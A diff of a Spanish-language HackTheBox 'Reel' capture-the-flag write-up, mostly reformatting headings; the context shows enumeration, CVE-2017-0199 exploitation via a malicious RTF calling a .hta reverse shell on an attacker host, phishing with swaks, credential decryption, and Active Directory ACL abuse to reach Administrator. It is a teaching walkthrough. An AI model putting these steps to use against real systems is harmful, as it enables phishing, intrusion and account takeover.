@@ -12,11 +12,11 @@ img_path: /photos/2023-08-02-Reel-WriteUp/
 El principal reto de esta máquina radica en la **explotación** de las **Listas de Control de Acceso (ACLs)** que se encuentran **configuradas incorrectamente**. Esto da lugar a una **escalada de privilegios a través de múltiples usuarios**, poniendo de manifiesto las amenazas que pueden surgir a raíz de una configuración de seguridad insuficiente en **Active Directory**.
 
 
-# Reconocimiento
+## Reconocimiento
 
 En esta etapa, nos esforzamos por recopilar la mayor cantidad de información posible sobre nuestro objetivo.
 
-## Identificación del Sistema Operativo con Ping
+### Identificación del Sistema Operativo con Ping
 
 Empezamos por realizar un _**ping**_ a la máquina víctima. La finalidad del _ping_ no es solamente confirmar la conectividad, sino también deducir el sistema operativo que la máquina víctima está utilizando. ¿Cómo lo hace? Por medio del _**Time to Live (TTL)**_.
 
@@ -38,7 +38,7 @@ rtt min/avg/max/mdev = 117.508/117.508/117.508/0.000 ms
 Observamos que el _**TTL**_ es 127, lo que sugiere que nos enfrentamos a una máquina **Windows**.
 
   
-## Descubrimiento de puertos
+### Descubrimiento de puertos
 
 El próximo paso en nuestro proceso de exploración es descubrir los puertos abiertos en la máquina víctima. Para ello, utilizamos la herramienta **nmap**. Nmap nos permite identificar los **puertos abiertos** (status open) en la máquina, que podrían ser potenciales vectores de ataque.
 
@@ -173,7 +173,7 @@ El resultado de este escaneo revela información adicional sobre los servicios e
 | 593 | ncacn_http | Es una implementación de RPC sobre HTTP en Windows. | Las vulnerabilidades o problemas de configuración pueden permitir la ejecución remota de código. | 
 
 
-## Puertos 139/445 abiertos (SMB)
+### Puertos 139/445 abiertos (SMB)
 
 Se lleva a cabo un reconocimiento inicial del protocolo SMB (Server Message Block), que opera a través de los puertos 139 y 445, debido a su relevancia en la configuración de redes Windows y a su conocido historial de vulnerabilidades explotables.
 
@@ -203,7 +203,7 @@ r1pfr4n@parrot> smbmap -H 10.10.10.77 -u 'test'
 
 Esto puede indicar que los recursos compartidos están restringidos a determinados usuarios, o simplemente que no existen en la máquina objetivo.
 
-## Puerto 135 abierto (RPC)
+### Puerto 135 abierto (RPC)
 
 RPC (Remote Procedure Call) es una tecnología que permite a un programa ejecutar código de manera remota. Ofrece múltiples oportunidades para la **enumeración de recursos del dominio**, incluyendo usuarios, grupos, políticas y más.
 
@@ -219,7 +219,7 @@ Desafortunadamente, los **intentos de enumerar** los usuarios y grupos del domin
 
 Esto sugiere que los permisos para enumerar los usuarios y grupos del dominio están restringidos en esta configuración específica. 
 
-## Puerto 21 abierto (FTP)
+### Puerto 21 abierto (FTP)
 
 El puerto 21 se asocia con el **protocolo FTP** (File Transfer Protocol), utilizado para la **transferencia de archivos** entre un cliente y un servidor en una red. En la fase de enumeración inicial, se detectó que la sesión de *anonymous* estaba **habilitada**. Esto significa que se permite el **acceso** al servidor FTP **sin requerir credenciales** de usuario válidas, permitiendo así a cualquier usuario anónimo interactuar con el servicio.
 
@@ -263,7 +263,7 @@ Esta dirección de **correo electrónico** puede pertenecer a un usuario válido
 
 Con esto concluye el reconocimiento del servicio FTP, y se procede a la exploración del servicio SMTP.
 
-## Puerto 25 abierto (SMTP)
+### Puerto 25 abierto (SMTP)
 
 El protocolo **Simple Mail Transfer Protocol** (SMTP), utilizado principalmente para **enviar correos electrónicos** entre servidores, puede proporcionar información valiosa durante la enumeración en una evaluación de seguridad. En particular, algunos comandos SMTP permiten la **enumeración de usuarios**, lo que puede revelar direcciones de correo electrónico válidas que se pueden explotar en ataques de phishing o intentos de inicio de sesión. 
 
@@ -325,7 +325,7 @@ La imagen a continuación muestra el resultado de la ejecución de la herramient
 
 Con la confirmación de que `nico@megabank.com` es un usuario válido en el sistema, se concluye la enumeración del servicio SMTP.
 
-# Consiguiendo Shell como Nico
+## Consiguiendo Shell como Nico
 
 Hasta ahora, la fase de reconocimiento ha proporcionado una serie de detalles valiosos sobre el sistema objetivo. Quizás el hallazgo más significativo fue el **contenido** del archivo `readme.txt` recuperado del servicio FTP, que incluía una solicitud para **enviar documentos en formato RTF** para su revisión y conversión. Este detalle sugiere una posible vulnerabilidad: la persona o el sistema que procesa estos documentos RTF podría ser susceptible a ciertos tipos de ataques.
 
@@ -333,7 +333,7 @@ Además, se ha confirmado que `nico@megabank.com` es un **usuario válido** del 
 
 La investigación de este posible vector de ataque podría revelar una **oportunidad para ganar un shell en el sistema objetivo**. De ser así, el siguiente paso sería proceder con la explotación para conseguir una shell como el usuario Nico.
 
-## Exploración de Vulnerabilidades - CVE-2017-0199
+### Exploración de Vulnerabilidades - CVE-2017-0199
 
 A través de la exploración de posibles vulnerabilidades, [se identifica el CVE-2017-0199](https://packetstormsecurity.com/files/142211/Microsoft-RTF-Remote-Code-Execution.html).
 
@@ -345,7 +345,7 @@ Esquema de ataque:
 
 ![imagen 2](Pasted image 20230728195311.png)
 
-### Creación del Archivo RTF Malicioso
+#### Creación del Archivo RTF Malicioso
 
 Para crear este archivo **RTF malicioso**, utilizaremos una herramienta de la comunidad disponible en [este repositorio de GitHub](https://github.com/bhdresh/CVE-2017-0199). El script que nos interesa se llama `cve-2017-0199_toolkit.py` y está escrito en Python 2.
 
@@ -362,7 +362,7 @@ Vamos a desglosar los parámetros que utilizamos:
 - `-u http://10.10.14.11/revshell.hta` es la URL que será invocada cuando se abra el archivo RTF. Esta URL apunta a nuestro archivo .hta malicioso que alojaremos en nuestro servidor.
 - `-x 0` indica que no queremos ofuscar el archivo RTF. Una opción de ofuscación podría ser útil para evadir algunas formas de detección, pero en este caso no es necesario.
 
-### Creación del Archivo .HTA Malicioso
+#### Creación del Archivo .HTA Malicioso
 
 Para crear el archivo **.hta malicioso**, utilizaremos la herramienta `msfvenom`. Primero, comprobamos si la herramienta ofrece el formato .hta con el siguiente comando:
 
@@ -383,7 +383,7 @@ De nuevo, vamos a desglosar los parámetros que utilizamos:
 - `-f hta-psh` indica que queremos que la salida esté en formato .hta.
 - `> revshell.hta` redirige la salida del comando a nuestro archivo `revshell.hta`.
 
-### Despliegue del Servidor y Escucha para la Shell Inversa
+#### Despliegue del Servidor y Escucha para la Shell Inversa
 
 Antes de enviar nuestro archivo RTF malicioso, necesitamos asegurarnos de que nuestro archivo .**hta malicioso está disponible para que el sistema objetivo lo descargue**. Para ello, desplegamos un servidor web simple con Python utilizando el siguiente comando:
 
@@ -408,7 +408,7 @@ Este comando inicia una escucha en el puerto 443, que es el puerto que especific
 - `-v` hace que Netcat sea más verboso, lo que puede ser útil para la depuración.
 - `-p 443` especifica el puerto en el que Netcat debe escuchar.
 
-### Envío del Archivo RTF al Usuario Nico
+#### Envío del Archivo RTF al Usuario Nico
 
 Finalmente, estamos listos para **enviar** nuestro **archivo RTF a Nico** utilizando la herramienta `swaks`. Es importante mencionar que, en un entorno real, la efectividad de un ataque de phishing depende en gran medida de cuán atractiva o "jugosa" sea la información presentada al usuario objetivo. En este caso, dado que se trata de un laboratorio y no una persona real quien abre los correos, hemos nombrado al archivo como `important.rtf`. Aunque este nombre no es particularmente llamativo, proporciona una aproximación al tipo de estrategias que podrían emplearse para atraer la atención del usuario. Además, hemos escogido "Important" como asunto del correo para aumentar la probabilidad de que Nico lo abra. 
 
@@ -431,7 +431,7 @@ Una vez enviado el correo, si todo va según lo planeado, deberíamos recibir un
 
 Esto concluye la fase de explotación y nos proporciona una **shell en el sistema objetivo como el usuario Nico**. En el [Anexo I](#anexo-i-descripción-del-proceso-automatizado-para-la-apertura-de-archivos-rtf), se detalla cómo el desarrollador de la máquina ha implementado este proceso de automatización de la apertura del archivo RTF enviado por el atacante. 
 
-## user.txt
+### user.txt
 
 Encontraremos la **primera flag** en el directorio **Desktop** del usuario **nico**:
 
@@ -440,15 +440,15 @@ type user.txt
 2e48737a657****42105b8be83b7bb3f
 ```
 
-# Consiguiendo Shell como Administrator
+## Consiguiendo Shell como Administrator
 
 Tras obtener una **shell inversa como el usuario Nico**, el siguiente paso en este escenario es **escalar privilegios** dentro del dominio. Para esto, se debe realizar una serie de tareas de **enumeración** y explotación adicionales.
 
-## Consiguiendo Shell como Tom
+### Consiguiendo Shell como Tom
 
 El primer paso para escalar privilegios será **pivotar del usuario Nico al usuario Tom**.
 
-### Adquisición de las Credenciales de Tom
+#### Adquisición de las Credenciales de Tom
 
 En el **directorio** de escritorio (**Desktop**) del usuario Nico, se encuentra un archivo llamado `cred.xml`. Este archivo contiene un objeto serializado de PowerShell. En particular, es un objeto `System.Management.Automation.PSCredential`, utilizado en PowerShell para **almacenar y manipular credenciales**, que son pares de nombres de usuario y contraseñas.
 
@@ -489,17 +489,17 @@ A continuación, se muestra la ejecución del comando que retorna el nombre de u
 
 ![imagen 2](tom_creds.png)
 
-### Acceso SSH como Tom
+#### Acceso SSH como Tom
 
 En las etapas iniciales de la exploración, se identificó que el **puerto 22 (SSH) estaba en funcionamiento**. Esta información abre la posibilidad de establecer una conexión SSH utilizando las credenciales descifradas `tom:1ts-mag1c!!!`. Con estos datos en mano, podemos proceder a **intentar ganar una shell SSH** mediante el uso del comando `ssh tom@10.10.10.77`, proporcionando la contraseña cuando sea requerida. Si el proceso es exitoso, lograremos **acceso a una shell SSH** en el sistema **como el usuario Tom**.
 
 ![imagen 2](Pasted image 20230802120633.png)
 
-## Consiguiendo Shell como Claire
+### Consiguiendo Shell como Claire
 
 El segundo paso para escalar privilegios será **pivotar del usuario Tom al usuario Claire**.
 
-### Exploración del Directorio AD Audit
+#### Exploración del Directorio AD Audit
 
 Una vez que **se ha conseguido acceso como Tom**, se realiza una exploración adicional de su directorio de **escritorio**. Se descubre una carpeta llamada "**AD Audit**". Este nombre sugiere que podría contener información sobre auditorías realizadas en Active Directory.
 
@@ -529,7 +529,7 @@ En la máquina del DC, se utiliza el comando `copy` para transferir el archivo a
 copy acls.csv \\10.10.14.3\shares\acls.csv
 ```
 
-### Análisis de las ACLs
+#### Análisis de las ACLs
 
 En el contexto de Active Directory, se manejan diferentes conceptos cuando se trata de asignar o limitar permisos y accesos a los diferentes objetos del dominio. Aquí es donde se introduce la Lista de Control de Acceso, o **ACL** por sus siglas en inglés (Access Control List).
 
@@ -557,7 +557,7 @@ Además, se descubre que Claire tiene el privilegio `WriteDacl` sobre el grupo *
 
 El grupo **Backup_Admins** parece ser significativo. Su asociación con operaciones de respaldo y administración sugiere que puede tener **privilegios especiales sobre el dominio**. Esta pista, junto con los privilegios recién descubiertos, indica una ruta de escalada de privilegios que vale la pena explorar.
 
-### Explotando el Privilegio WriteOwner: Cambiando la Contraseña de Claire
+#### Explotando el Privilegio WriteOwner: Cambiando la Contraseña de Claire
 
 El proceso para explotar la ACL `WriteOwner` y c**ambiar la contraseña del usuario Claire** consta de varios pasos. Se llevará a cabo utilizando la herramienta PowerView.ps1, que ya se encuentra en el sistema en la ruta `C:\Users\tom\Desktop\AD Audit\BloodHound\PowerView.ps1`.
 
@@ -599,13 +599,13 @@ Resultado de la ejecución de los comandos anteriores:
 
 ![imagen 2](Pasted image 20230802135721.png)
 
-### Acceso SSH como Claire
+#### Acceso SSH como Claire
 
 Una vez que la contraseña de Claire ha sido cambiada, es posible obtener una **shell como este usuario a través de SSH**. Esto se hace de la misma manera que se hizo con el usuario Tom, utilizando el comando `ssh claire@10.10.10.77`. Al ingresar la nueva contraseña cuando se solicite, se obtendrá acceso a la máquina como el usuario Claire:
 
 ![imagen 2](Pasted image 20230802174100.png)
 
-## Explotando el Privilegio WriteDACL: Incorporando a Claire en Backup_Admins
+### Explotando el Privilegio WriteDACL: Incorporando a Claire en Backup_Admins
 
 Habiendo obtenido una **shell como Claire**, el paso sucesivo es incorporar a Claire en el grupo *Backup_Admins*. Recordemos que Claire tiene el privilegio `WriteDACL` sobre este grupo, lo que le permite alterar sus miembros. Para llevar a cabo esta acción, utilizamos el comando `net` de Windows, que proporciona una amplia gama de funciones para gestionar cuentas de usuario y grupos:
 
@@ -619,7 +619,7 @@ Una vez ejecutado este comando, es posible confirmar que Claire ha sido agregada
 
 Es recomendable **restablecer la conexión SSH** en este punto para asegurar que todos los cambios se apliquen de manera efectiva.
 
-## Explorando Privilegios Adquiridos y Descubrimiento de Nuevas Oportunidades
+### Explorando Privilegios Adquiridos y Descubrimiento de Nuevas Oportunidades
 
 Con Claire ahora como miembro del grupo *Backup_Admins*, nuestra atención se desvía hacia el examen del **directorio del usuario Administrator**, donde se descubre que **este grupo posee ciertos permisos privilegiados**. Los permisos de este directorio se detallan a continuación:
 
@@ -645,7 +645,7 @@ Al ejecutar el comando, aparecen las siguientes líneas:
 
 Ambas líneas proceden del mismo archivo `BackupScript.ps1`. Parece que la contraseña del usuario admin, posiblemente del usuario Administrator, es `Cr4ckMeIfYouC4n!`.
 
-## Acceso SSH como Administrator
+### Acceso SSH como Administrator
 
 Para confirmar la validez de la contraseña `Cr4ckMeIfYouC4n!` obtenida para el usuario Administrator, se procede a realizar un intento de autenticación por SSH.
 
@@ -659,7 +659,7 @@ Las credenciales son correctas, ya que es posible autenticarse con éxito:
 
 Con esto, se han obtenido los máximos privilegios en el dominio `htb.local` y ya se puede listar la **segunda flag**.
 
-## root.txt
+### root.txt
 
 La segunda flag se encuentra en el directorio **Desktop** del usuario **Administrator**:
 
@@ -668,11 +668,11 @@ type root.txt
 01f1c3d9b5b9e5****eb9a7599389b7 
 ```
 
-# Anexo I: Descripción del Proceso Automatizado para la Apertura de Archivos RTF
+## Anexo I: Descripción del Proceso Automatizado para la Apertura de Archivos RTF
 
 Este Anexo se centra en describir la configuración automatizada de la máquina REEL para abrir automáticamente los archivos RTF y DOC, simulando así la actividad de un usuario real. Este proceso se lleva a cabo mediante una serie de scripts alojados en el directorio `Documents` del usuario Nico, así como a través de la interacción con dos carpetas específicas: `Attachments` y `Processed`.
 
-## Configuración del Directorio
+### Configuración del Directorio
 
 El contenido del directorio `Documents` del usuario Nico es el siguiente:
 
@@ -686,7 +686,7 @@ Existen tres elementos principales que son necesarios para este proceso de autom
 
 3. **Scripts**: Existen dos scripts principales, `auto-enter.ahk` y `open-attachments.bat`, que facilitan la automatización de la apertura y procesamiento de los archivos.
 
-## Funcionamiento de los Scripts
+### Funcionamiento de los Scripts
 
 El funcionamiento de estos scripts es crucial para la automatización del proceso. A continuación, se detalla cómo funcionan estos scripts:
 
@@ -739,7 +739,7 @@ El script busca archivos con las extensiones .doc y .rtf en el directorio `Attac
 
 Este proceso automatizado tiene como **objetivo** activar una vulnerabilidad específica: **CVE-2017-0199**. Esta es una vulnerabilidad de ejecución remota de código presente en la manera en que Microsoft Office y **WordPad** analizan los documentos RTF.
 
-## Verificación de la Ejecución del Script
+### Verificación de la Ejecución del Script
 
 Para verificar que el script `open-attachments.bat` se está ejecutando en el sistema, se puede utilizar el comando `Get-WmiObject` de PowerShell, que proporciona información sobre los procesos en ejecución en el sistema. A continuación, se muestra un ejemplo de cómo se puede utilizar para verificar la ejecución del script:
 
@@ -753,7 +753,7 @@ Si `open-attachments.bat` se está ejecutando, se verá su ruta en la salida de 
 
 En esta salida, el primer proceso de `cmd.exe` es el que ejecuta `open-attachments.bat`, lo que indica que el script se está ejecutando actualmente.
 
-# Anexo II: Análisis de los Permisos del Archivo root.txt
+## Anexo II: Análisis de los Permisos del Archivo root.txt
 
 En el transcurso de la resolución de la máquina, surgió una pregunta intrigante: ¿Por qué, a pesar de tener acceso total al directorio del usuario Administrator, el grupo `Backup_Admins` no pudo visualizar el contenido del archivo `root.txt`? Para responder a esta pregunta, se examinaron en detalle los permisos de seguridad asociados con el archivo `root.txt`.
 
@@ -772,6 +772,3 @@ La estructura de estos permisos se desglosa de la siguiente manera:
 4. **HTB\Administrator:(F):** El usuario Administrator tiene control total (F) sobre el archivo, lo que significa que puede realizar cualquier operación en él, incluyendo lectura, escritura, ejecución, cambio de propiedades, y más.
 
 En resumen, la razón por la cual el usuario Claire, perteneciente al grupo `Backup_Admins`, no pudo visualizar la flag contenida en `root.txt` se debe a un permiso de denegación explícito aplicado a ese grupo en particular. Aunque Claire tenía permisos para acceder al directorio en el que se encontraba el archivo, la configuración de permisos en el archivo `root.txt` en sí mismo impidió que ella lo leyera.
-
-
-R1pFr4n
